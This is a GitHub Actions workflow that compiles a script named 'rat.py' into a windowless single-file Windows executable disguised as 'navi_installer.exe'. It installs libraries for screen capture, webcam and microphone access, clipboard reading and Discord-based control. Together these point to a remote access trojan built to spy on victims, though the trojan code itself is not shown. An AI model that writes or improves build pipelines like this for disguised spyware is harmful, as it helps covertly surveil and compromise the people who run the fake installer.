name: Build Windows EXE

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    
    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'
    
    - name: Install dependencies
      run: |
        pip install pyinstaller
        pip install discord.py pyautogui mss psutil opencv-python pyaudio pillow pyperclip cryptography
    
    - name: Build EXE
      run: |
        pyinstaller --onefile --windowed --name=navi_installer rat.py
    
    - name: Upload EXE as artifact
      uses: actions/upload-artifact@v4
      with:
        name: navi_installer
        path: dist/navi_installer.exe
        
